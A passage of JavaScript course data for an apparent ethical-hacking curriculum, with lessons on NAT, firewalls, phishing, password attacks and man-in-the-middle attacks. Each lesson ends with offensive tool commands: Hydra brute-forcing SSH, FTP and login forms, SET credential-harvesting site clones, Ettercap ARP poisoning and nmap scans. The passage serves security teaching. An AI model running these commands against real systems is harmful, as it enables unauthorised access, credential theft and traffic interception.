          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Network Address Translation (NAT) and port forwarding are essential in modern networking and cybersecurity. NAT allows multiple devices on a private network to share a single public IP address, while port forwarding ensures external requests can reach specific devices or services inside a private network.</p>
          <p class="mb-6 text-gray-300">These mechanisms are widely used in home networks, corporate environments, and security labs to manage IPs, control access, and secure internal resources.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is NAT (Network Address Translation)?</h2>
          <p class="mb-3 text-gray-300">NAT modifies IP address information in packet headers as they pass through a router or firewall. Its main purpose is to allow multiple devices with private IPs to communicate externally using a single public IP.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">Key Features of NAT</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>IP Conservation — reduces need for multiple public IPs</li>
            <li>Security — hides internal network structure from outsiders</li>
            <li>Flexibility — enables internal devices to communicate externally without exposure</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Types of NAT</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li><span class="font-semibold text-white">Static NAT:</span> Maps one private IP to one public IP. Example: an internal server always appears as the same public IP externally.</li>
            <li><span class="font-semibold text-white">Dynamic NAT:</span> Maps private IPs to a pool of public IPs on a first-come, first-served basis.</li>
            <li><span class="font-semibold text-white">PAT (Port Address Translation) / NAT Overload:</span> Maps multiple private IPs to a single public IP using unique port numbers (common in home routers).</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">What is Port Forwarding?</h2>
          <p class="mb-3 text-gray-300">Port forwarding (port mapping) redirects network traffic from a specific port on a public IP to a device or service inside a private network.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">How It Works</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>A client on the internet sends a request to a public IP on a specific port</li>
            <li>The router receives the request and forwards it to a designated internal IP and port</li>
            <li>The internal service responds, and the router returns the response externally</li>
          </ul>
          <p class="mb-6 text-gray-300"><span class="font-semibold text-white">Example:</span> Forward external port 8080 to internal server 192.168.1.10 on port 80 to allow external users to access the internal web server securely.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why NAT and Port Forwarding are Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Security — NAT hides internal IPs, making direct attacks harder</li>
            <li>Access Control — port forwarding exposes only intended services</li>
            <li>IP Management — reduces need for public IPs</li>
            <li>Service Flexibility — host services inside private networks safely</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">NAT & Port Forwarding in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Test which ports are open to the internet</li>
            <li>Identify misconfigured routers exposing sensitive services</li>
            <li>Bypass restrictions for penetration testing in lab environments</li>
            <li>Understand attack paths from external networks to internal systems</li>
          </ul>
          <p class="mb-6 text-gray-300">Improper port forwarding can allow attackers to access internal web servers, RDP, or IoT devices.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">NAT & Port Forwarding in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Restrict external access to necessary services</li>
            <li>Hide internal network structure</li>
            <li>Implement DMZ for public-facing servers</li>
            <li>Monitor for unusual external access attempts</li>
          </ul>
          <p class="mb-6 text-gray-300">Proper NAT and port forwarding configurations are fundamental to network hardening and layered defense.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Real-World Use Cases</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Home routers using NAT to share a single internet connection</li>
            <li>Corporate networks exposing public web services via port forwarding</li>
            <li>VPNs using NAT to allow remote users secure access to internal networks</li>
            <li>Ethical hacking labs simulating external access via controlled port forwarding</li>
          </ul>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – NAT/Port Forwarding',
            content: `🛠 Tool Name: Netcat (nc)

Related Concept: Testing NAT and Port Forwarding

What is Netcat?
Netcat is a versatile networking tool capable of reading/writing data across network connections, ideal for testing port forwarding and connectivity.

Why This Tool Matches This Topic
Can test open ports on public/private networks
Works as both client and server for TCP/UDP
Simple yet powerful for network experiments
Widely used in penetration testing labs

Basic Commands
Start a Simple TCP Listener
nc -lvp 8080

Connect to Remote Host
nc target_ip 8080

Test Port Forwarding
Set up a listener on an internal host
Connect from external host to verify forwarding works

Send a File
nc -lvp 8080 > received_file.txt

Receive a file sent from another host using Netcat`
          }
        ]
      },
      {
        title: 'Basic Firewall Rules & Policies',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Firewalls are essential for network security, but simply having a firewall is not enough. The effectiveness of a firewall depends on the rules and policies configured on it. Rules define which traffic is allowed, blocked, or logged, while policies provide the framework for consistent, secure rule management.</p>
          <p class="mb-6 text-gray-300">Understanding how to create and enforce firewall rules is critical for defensive security and ethical hacking, as misconfigurations are a common cause of vulnerabilities.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What are Firewall Rules?</h2>
          <p class="mb-3 text-gray-300">Firewall rules are instructions that dictate how a firewall should handle network traffic. Each rule specifies conditions such as:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Source IP Address — origin of the traffic</li>
            <li>Destination IP Address — target of the traffic</li>
            <li>Port Number — which service or application the rule applies to</li>
            <li>Protocol — TCP, UDP, or ICMP</li>
            <li>Action — allow, block, reject, or log the traffic</li>
          </ul>
          <p class="mb-6 text-gray-300">Rules are evaluated sequentially; the first matching rule is applied. Proper ordering is crucial, as incorrectly ordered rules can inadvertently block or allow traffic.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What are Firewall Policies?</h2>
          <p class="mb-3 text-gray-300">Firewall policies are broader guidelines that define how traffic should be managed across an organization. Policies often include:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Acceptable use of network resources</li>
            <li>Guidelines for opening and closing ports</li>
            <li>Segmentation of internal and external networks</li>
            <li>Logging and monitoring requirements</li>
            <li>Compliance with regulatory standards</li>
          </ul>
          <p class="mb-6 text-gray-300">Policies ensure that firewall rules align with security objectives and reduce the risk of misconfigurations.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Types of Firewall Rules</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Allow Rules — permit specific traffic based on IP, port, or protocol</li>
            <li>Deny/Block Rules — explicitly block unwanted traffic</li>
            <li>Reject Rules — deny traffic but send an error response</li>
            <li>Logging Rules — record traffic for monitoring and audits</li>
          </ul>
          <p class="mb-6 text-gray-300"><span class="font-semibold text-white">Example:</span> Allow HTTP (port 80) from internal network to the internet, block all other inbound traffic to internal servers, and log attempts to access blocked ports.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Best Practices</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Follow least privilege — only allow necessary traffic</li>
            <li>Default deny — block all traffic not explicitly allowed</li>
            <li>Review and update rules regularly</li>
            <li>Use logging to detect anomalies and attempted breaches</li>
            <li>Combine with IDS/IPS and monitoring for layered defense</li>
            <li>Test rules in a lab before deploying</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Firewall Rules & Policies Matter</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Prevent unauthorized access to internal systems</li>
            <li>Control network traffic to reduce attack surface</li>
            <li>Enforce organizational security requirements</li>
            <li>Support compliance and auditing</li>
            <li>Reduce risks from misconfigurations</li>
          </ul>
          <p class="mb-6 text-gray-300">A well-structured firewall with clear rules and policies is foundational to network security.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Firewall Rules in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Identify open and closed ports</li>
            <li>Detect misconfigurations</li>
            <li>Plan penetration testing strategies</li>
            <li>Understand traffic flows through the network</li>
          </ul>
          <p class="mb-6 text-gray-300">By simulating attacks, testers can determine if rules effectively block unauthorized traffic.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Firewall Policies in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Standardize configurations across the organization</li>
            <li>Ensure consistent enforcement of access control</li>
            <li>Monitor and update rules based on emerging threats</li>
            <li>Protect critical servers, applications, and data</li>
          </ul>
          <p class="mb-6 text-gray-300">Policies and robust rule sets together ensure resilient network defense.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Firewall Rules & Policy',
            content: `🛠 Tool Name: ufw (Uncomplicated Firewall)

Related Concept: Managing Firewall Rules & Policies

What is ufw?
ufw is a simple Linux tool for managing firewall rules. It provides a command-line interface to configure allow, deny, and logging rules quickly.

Why This Tool Matches This Topic
Simplifies firewall rule management
Supports IPv4 and IPv6 traffic
Useful for beginners to learn rules and policies
Common on Linux servers and labs

Basic Commands
Enable ufw
sudo ufw enable

Allow SSH (Port 22)
sudo ufw allow 22/tcp

Deny HTTP (Port 80)
sudo ufw deny 80/tcp

View Active Rules
sudo ufw status verbose

Reset Firewall to Defaults
sudo ufw reset`
          }
        ]
      },
      {
        title: 'Real-world Firewall Use Cases',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Firewalls are more than just technical devices — they are strategic components of an organization’s cybersecurity posture. Real-world use cases illustrate how firewalls protect networks, applications, and users from attacks, unauthorized access, and data leaks. Studying these examples helps you understand practical implementation, best practices, and limitations in real environments.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">1. Protecting Corporate Networks</h2>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Block unauthorized access from external networks</li>
            <li>Restrict traffic to critical servers (HR databases, finance systems)</li>
            <li>Segment internal departments to reduce lateral movement</li>
            <li>Log traffic to monitor for anomalies</li>
          </ul>
          <p class="mb-6 text-gray-300"><span class="font-semibold text-white">Example:</span> A bank allows only internal finance applications to communicate with core banking servers while other traffic is restricted.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">2. Web Application Security</h2>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Inspect HTTP/HTTPS traffic</li>
            <li>Block requests containing malicious payloads</li>
            <li>Protect sensitive backend servers</li>
          </ul>
          <p class="mb-6 text-gray-300"><span class="font-semibold text-white">Example:</span> An e-commerce site uses a WAF to block unauthorized attempts to modify customer data or exploit vulnerabilities.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">3. Remote Access Control</h2>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Ensure only authenticated users access internal resources</li>
            <li>Inspect traffic from untrusted networks</li>
            <li>Block unnecessary ports to prevent exploitation</li>
          </ul>
          <p class="mb-6 text-gray-300"><span class="font-semibold text-white">Example:</span> A company allows VPN traffic over port 443 for remote employees while blocking all other external connections.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">4. Cloud Security</h2>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Control access to virtual machines and storage</li>
            <li>Restrict inbound and outbound traffic to authorized users</li>
            <li>Protect against DDoS and malicious traffic</li>
            <li>Implement security groups and network ACLs for granular control</li>
          </ul>
          <p class="mb-6 text-gray-300"><span class="font-semibold text-white">Example:</span> An AWS instance is protected by security groups that only allow HTTP, HTTPS, and SSH from specified IP ranges.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">5. Home Network Security</h2>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Routers include NAT and packet filtering</li>
            <li>Protect IoT devices and computers from external attacks</li>
            <li>Enable parental controls and content filtering</li>
          </ul>
          <p class="mb-6 text-gray-300"><span class="font-semibold text-white">Example:</span> A smart home router blocks inbound traffic from unknown IPs while allowing outbound traffic for authorized devices.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">6. Educational & Lab Environments</h2>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Configure firewalls to understand rules and policies</li>
            <li>Test attack and defense scenarios in a controlled environment</li>
            <li>Learn interactions among packet filtering, stateful firewalls, IDS/IPS, and proxies</li>
          </ul>
          <p class="mb-6 text-gray-300"><span class="font-semibold text-white">Example:</span> Students set up labs with packet filtering and stateful firewalls to test penetration attempts and monitor allowed/blocked traffic.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Studying Real-World Use Cases is Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Visualize firewall deployment across environments</li>
            <li>Recognize misconfigurations that lead to breaches</li>
            <li>Learn layered security combining multiple firewall types</li>
            <li>Apply theory in ethical hacking and defensive strategies</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Key Takeaways</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Firewalls shape network security architecture, not just block traffic</li>
            <li>Layered deployments enhance protection (packet filtering + stateful + application-level)</li>
            <li>Monitoring, logging, and rule updates are essential</li>
            <li>Practical exposure strengthens both offensive and defensive skills</li>
          </ul>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Firewall Use Case Testing',
            content: `🛠 Tool Name: Nmap

Related Concept: Firewall Testing and Analysis

What is Nmap?
Nmap is a powerful network scanning tool used to discover open ports, detect firewall rules, and map network security. It helps assess firewall effectiveness and identify misconfigurations.

Why This Tool Matches This Topic
Scans networks to identify open/closed ports
Evaluates firewall rule enforcement
Widely used for penetration testing and auditing
Provides insights into firewall behavior in real networks

Basic Commands
Scan a Target for Open Ports
nmap target_ip

Scan with Version Detection
nmap -sV target_ip

Scan for Firewall Rules (Stealth SYN)
nmap -sS target_ip

Scan Specific Ports
nmap -p 22,80,443 target_ip`
          }
        ]
      }
    ]
  },
  {
    id: 'module-6',
    title: 'Module 6: Cyber Attacks & Security Certifications Introduction',
    duration: '1 week',
    description: 'Overview of common attacks and certification paths.',
    lessons: [
      {
        title: 'Phishing Attacks',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Phishing is one of the most common and dangerous cyber attacks targeting individuals and organizations. It involves tricking users into revealing sensitive information such as usernames, passwords, credit card numbers, or other personal data. Attackers craft convincing emails, messages, or websites to deceive victims into taking actions that compromise their security.</p>
          <p class="mb-6 text-gray-300">Despite being widely known, phishing remains highly effective because it exploits human psychology rather than technical vulnerabilities, making awareness and defense critical.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Types of Phishing Attacks</h2>
          <h3 class="text-lg font-semibold mb-2 text-white">Email Phishing</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Attackers send emails posing as trusted organizations (banks, social media, or government agencies)</li>
            <li>Victims are directed to fake websites that capture credentials</li>
            <li><span class="font-semibold text-white">Example:</span> A fake “account verification” email asking users to enter login information</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Spear Phishing</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Highly targeted attack aimed at specific individuals or organizations</li>
            <li>Uses personal information to increase credibility</li>
            <li><span class="font-semibold text-white">Example:</span> An attacker emails an employee pretending to be their manager with an urgent request</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Smishing (SMS Phishing)</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Phishing via text messages</li>
            <li>May include links or phone numbers to extract personal information</li>
            <li><span class="font-semibold text-white">Example:</span> “Your package could not be delivered; click this link to reschedule.”</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Vishing (Voice Phishing)</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Phishing via phone calls</li>
            <li>Attackers impersonate bank officials, IT support, or government agents</li>
            <li><span class="font-semibold text-white">Example:</span> A caller claims your account is compromised and asks for OTP or PIN</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Clone Phishing</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>A legitimate email is copied and modified to include malicious links or attachments</li>
            <li>Victims are tricked because the original email was familiar</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Pharming</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Redirects users to fake websites even if they enter the correct URL</li>
            <li>Often done by compromising DNS servers or local hosts files</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">How Phishing Works</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Attackers research targets to make messages appear credible</li>
            <li>Malicious links or attachments are included in emails, messages, or websites</li>
            <li>Clicking links or downloading files can install malware or capture credentials</li>
            <li>Stolen information can lead to identity theft, financial loss, or further attacks</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Phishing is Effective</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Exploits human trust and urgency (“Your account will be locked!”)</li>
            <li>Uses social engineering to manipulate emotions like fear, curiosity, or greed</li>
            <li>Often bypasses technical security measures if users voluntarily provide information</li>
            <li>Uses techniques like HTTPS, realistic logos, and personalized content</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Defending Against Phishing</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Verify email senders and URLs before clicking links</li>
            <li>Use multi-factor authentication (MFA) for critical accounts</li>
            <li>Avoid downloading attachments from unknown sources</li>
            <li>Regularly educate users on phishing tactics and examples</li>
            <li>Deploy email filters, spam detection, and web security solutions</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Phishing in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Simulate phishing to test awareness and readiness</li>
            <li>Identify weak links in social engineering defenses</li>
            <li>Train employees using controlled, harmless campaigns</li>
            <li>Understand attacker tactics to improve defenses</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Phishing in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Use advanced spam and malware filters</li>
            <li>Deploy anti-phishing toolbars and browser extensions</li>
            <li>Conduct employee training and simulated exercises</li>
            <li>Log and alert on suspicious links and domains</li>
          </ul>
          <p class="mb-6 text-gray-300">Organizations combine technical and human defenses to reduce phishing-related breaches.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Phishing',
            content: `🛠 Tool Name: Social-Engineer Toolkit (SET)

Related Concept: Simulating Phishing Attacks

What is SET?
SET is a specialized penetration testing tool designed to simulate social engineering attacks, including phishing, to test awareness and defenses.

Why This Tool Matches This Topic
Creates realistic phishing emails and websites
Simulates credential harvesting in lab environments
Helps learners understand attacker tactics safely
Widely used in ethical hacking and awareness training

Basic Commands / Usage
Start Social-Engineer Toolkit
sudo setoolkit

Select Social-Engineering Attacks
Choose Social-Engineering Attacks from the menu
Select Website Attack Vectors for phishing simulations

Clone a Website
Choose Credential Harvester Attack Method
Enter the URL of the target website (lab use)
SET generates a cloned site to capture credentials

Send Phishing Email (Lab Only)
Use Mass Mailer Attack module
Configure email templates and target addresses
Simulate campaigns in controlled environments`
          }
        ]
      },
      {
        title: 'Brute-Force & Password Attacks',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Passwords are the most commonly used method of authentication, but they are also one of the weakest security controls when poorly implemented. Brute-force and password attacks aim to gain unauthorized access by guessing or cracking passwords. These attacks are dangerous because they often succeed without exploiting software vulnerabilities, relying on weak human password practices.</p>
          <p class="mb-6 text-gray-300">Attackers use automation, wordlists, and computational power to attempt thousands or millions of password combinations in a short time.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is a Brute-Force Attack?</h2>
          <p class="mb-3 text-gray-300">A brute-force attack tries every possible combination of characters until the correct password is found. While time-consuming for strong passwords, it is highly effective against:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Short passwords</li>
            <li>Simple passwords</li>
            <li>Systems without login attempt limits</li>
          </ul>
          <p class="mb-6 text-gray-300"><span class="font-semibold text-white">Example:</span> Trying all combinations of lowercase letters for a 6-character password.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Types of Password Attacks</h2>
          <h3 class="text-lg font-semibold mb-2 text-white">Simple Brute-Force Attack</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Attempts all possible combinations</li>
            <li>Guaranteed success given enough time</li>
            <li>Slower but effective on weak systems</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Dictionary Attack</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Uses predefined wordlists</li>
            <li>Faster than brute-force</li>
            <li>Exploits commonly used passwords</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Hybrid Attack</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Combines dictionary words with numbers or symbols</li>
            <li><span class="font-semibold text-white">Example:</span> password123, admin@2024</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Credential Stuffing</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Uses leaked username-password pairs from breaches</li>
            <li>Highly effective due to password reuse</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Rainbow Table Attack</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Uses precomputed hash tables</li>
            <li>Fast hash cracking if no salting is used</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Offline Password Cracking</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Cracking stolen password hashes without interacting with the live system</li>
            <li>Much faster and harder to detect</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Password Attacks are Successful</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Password reuse across platforms</li>
            <li>Weak password policies</li>
            <li>No account lockout or rate limiting</li>
            <li>Lack of multi-factor authentication (MFA)</li>
            <li>Poor password storage (unsalted hashes)</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Real-World Impact</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Unauthorized system access</li>
            <li>Data breaches and data theft</li>
            <li>Financial fraud</li>
            <li>Lateral movement within networks</li>
            <li>Full system or domain compromise</li>
          </ul>
          <p class="mb-6 text-gray-300">Many high-profile breaches occurred due to compromised credentials rather than software flaws.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Defense Against Password Attacks</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Enforce strong password policies</li>
            <li>Implement account lockout after failed attempts</li>
            <li>Use MFA wherever possible</li>
            <li>Store passwords using strong hashing and salting</li>
            <li>Monitor login attempts for anomalies</li>
            <li>Educate users about password hygiene</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Brute-Force Attacks in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Test password policy strength</li>
            <li>Identify weak credentials</li>
            <li>Demonstrate risk to organizations</li>
            <li>Improve authentication security controls</li>
          </ul>
          <p class="mb-6 text-gray-300">These attacks are conducted only in authorized environments.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Password Attacks in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Analyze login attempt patterns</li>
            <li>Review failed authentication logs</li>
            <li>Flag unusual access times or locations</li>
            <li>Identify multiple login attempts from a single IP</li>
          </ul>
          <p class="mb-6 text-gray-300">Security teams use these insights to block attackers and strengthen defenses.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Password Attack',
            content: `🛠 Tool Name: Hydra

Related Concept: Brute-Force & Password Attacks

What is Hydra?
Hydra is a powerful online password cracking tool that supports multiple protocols, including SSH, FTP, HTTP, RDP, and more.

Why This Tool Matches This Topic
Designed for brute-force and dictionary attacks
Supports parallel login attempts
Widely used in ethical hacking labs
Demonstrates real-world password attack techniques

Basic Commands
Brute-Force SSH Login
hydra -l username -P wordlist.txt ssh://target_ip

Brute-Force FTP Login
hydra -l admin -P passwords.txt ftp://target_ip

HTTP Login Form Attack
hydra -l user -P wordlist.txt target_ip http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"

Limit Attempts (Safer Testing)
hydra -t 4 -l user -P wordlist.txt ssh://target_ip`
          }
        ]
      },
      {
        title: 'Man-in-the-Middle Attacks',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">A Man-in-the-Middle (MITM) attack is a dangerous cyber attack where an attacker secretly intercepts, monitors, and potentially alters communication between two parties who believe they are communicating directly. The attacker sits between the victim and destination, gaining visibility into exchanged data.</p>
          <p class="mb-6 text-gray-300">MITM attacks can compromise confidentiality, integrity, and privacy without either party realizing the communication has been breached.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">How a MITM Attack Works</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>A victim connects to a network (often unsecured or compromised)</li>
            <li>The attacker intercepts traffic between the victim and target</li>
            <li>The attacker can read sensitive data (usernames, passwords, session cookies)</li>
            <li>In advanced cases, the attacker modifies or injects malicious data</li>
          </ul>
          <p class="mb-6 text-gray-300">Since communication appears normal, MITM attacks can remain undetected for long periods.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Common Types of MITM Attacks</h2>
          <h3 class="text-lg font-semibold mb-2 text-white">1. ARP Spoofing (ARP Poisoning)</h3>
          <p class="mb-3 text-gray-300">The attacker sends fake ARP responses to associate their MAC address with the IP of another device (often the gateway), allowing interception of traffic.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">2. DNS Spoofing</h3>
          <p class="mb-3 text-gray-300">Manipulating DNS responses to redirect users to malicious websites even when correct URLs are entered.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">3. Wi-Fi Eavesdropping</h3>
          <p class="mb-3 text-gray-300">Creating fake access points or exploiting open networks to intercept traffic.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">4. SSL Stripping</h3>
          <p class="mb-3 text-gray-300">Downgrading HTTPS to HTTP, removing encryption and enabling plaintext capture.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">5. Session Hijacking</h3>
          <p class="mb-6 text-gray-300">Capturing session cookies to impersonate authenticated users without knowing credentials.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why MITM Attacks Are Dangerous</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Theft of login credentials</li>
            <li>Exposure of financial and personal data</li>
            <li>Unauthorized account access</li>
            <li>Data manipulation and injection</li>
            <li>Surveillance of private communications</li>
          </ul>
          <p class="mb-6 text-gray-300">These attacks bypass traditional security because the attacker exploits network trust and weak encryption rather than directly breaking into systems.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">MITM Attacks in Public Networks</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Public Wi-Fi often lacks encryption</li>
            <li>Multiple users share the same network</li>
            <li>ARP spoofing is easy to perform</li>
            <li>Users trust networks without verification</li>
          </ul>
          <p class="mb-6 text-gray-300">Common examples include airports, cafés, hotels, and libraries.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Defense Against MITM Attacks</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Use HTTPS with valid certificates</li>
            <li>Implement SSL/TLS encryption everywhere</li>
            <li>Avoid public Wi-Fi for sensitive tasks</li>
            <li>Use VPNs to encrypt traffic</li>
            <li>Enable ARP inspection and DHCP snooping on switches</li>
            <li>Monitor network traffic for anomalies</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">MITM Attacks in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Test network security</li>
            <li>Identify weak encryption or misconfigurations</li>
            <li>Demonstrate risks of unsecured networks</li>
            <li>Train teams on detection and prevention</li>
          </ul>
          <p class="mb-6 text-gray-300">Testing is conducted only in controlled lab environments.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">MITM Attacks in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Analyze ARP table changes</li>
            <li>Check for certificate mismatches</li>
            <li>Monitor suspicious DNS behavior</li>
            <li>Investigate unexpected traffic routing</li>
            <li>Watch for network latency anomalies</li>
          </ul>
          <p class="mb-6 text-gray-300">Advanced detection tools and monitoring systems help identify MITM behavior early.</p>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – MITM Attack',
            content: `🛠 Tool Name: Ettercap

Related Concept: Man-in-the-Middle Attacks

What is Ettercap?
Ettercap is a comprehensive network security tool designed for MITM attacks, enabling interception, analysis, and manipulation of traffic.

Why This Tool Matches This Topic
Designed specifically for MITM scenarios
Supports ARP poisoning and sniffing
Enables real-time traffic interception
Commonly used in ethical hacking labs

Basic Commands
Start Ettercap in Graphical Mode
sudo ettercap -G

Start Ettercap in Text Mode
sudo ettercap -T

Perform ARP Poisoning (Lab)
sudo ettercap -T -q -i eth0 -M arp:remote /victim_ip/ /gateway_ip/

Enable Packet Sniffing
Select sniffing mode inside Ettercap
Monitor intercepted credentials and data`
          }
        ]
      },
      {
